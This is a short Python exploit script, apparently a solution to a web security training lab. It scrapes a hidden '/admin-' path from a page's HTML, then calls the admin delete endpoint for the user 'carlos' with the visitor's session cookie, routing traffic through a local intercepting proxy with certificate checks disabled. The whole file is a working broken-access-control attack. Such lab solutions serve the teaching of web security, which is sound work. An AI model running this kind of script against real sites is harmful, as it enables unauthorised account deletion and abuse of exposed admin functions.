import sys
import urllib3
import requests
import re
from bs4 import BeautifulSoup
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def delete_user(url):
    r=requests.get(url,verify=False,proxies=proxies)
    session_cookie=r.cookies.get_dict().get('session')
    soup=BeautifulSoup(r.text,'lxml')#extracted html text
    admin_instance=soup.find(text=re.compile("/admin-"))
    admin_link = re.search(r"/admin-[A-Za-z0-9]+", admin_instance).group(0)
    delete_carlos=url+admin_link+'/delete?username=carlos'
    cookies={"session" : session_cookie}
    r=requests.get(delete_carlos,cookies=cookies,verify=False,proxies=proxies)
    if r.status_code==200:
        print("Successful")
    else:
        print("Failed")
        sys.exit(-1)
def main():
    if len(sys.argv)!=2:
        print(f"Format: Python {sys.argv[0]} <lab-url>")
        sys.exit(-1)
    url=sys.argv[1]
    delete_user(url) 

if __name__=="__main__":
    main()